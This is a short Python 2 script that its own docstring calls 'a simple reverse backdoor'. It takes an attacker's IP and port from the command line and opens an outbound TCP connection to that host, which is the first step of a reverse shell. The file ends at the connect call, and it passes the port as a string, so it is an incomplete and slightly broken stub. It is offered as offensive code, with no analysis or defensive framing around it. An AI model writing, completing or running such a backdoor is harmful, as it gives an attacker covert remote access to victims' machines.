#! /usr/bin/python
"""A simple reverse backdoor script.
   Uses Python 2.7.16"""

import optparse
import socket

def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = optparse.OptionParser()
    # arguments
    parser.add_option('-a', '--attacker', dest='attacker', help='Attacking host IP.')
    parser.add_option('-p', '--port', dest='port', help='Port to connect to.')

    (options, arguments) = parser.parse_args()

    return options


options = get_arguments()


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # IPv4 and TCP
connection.connect((options.attacker, options.port))
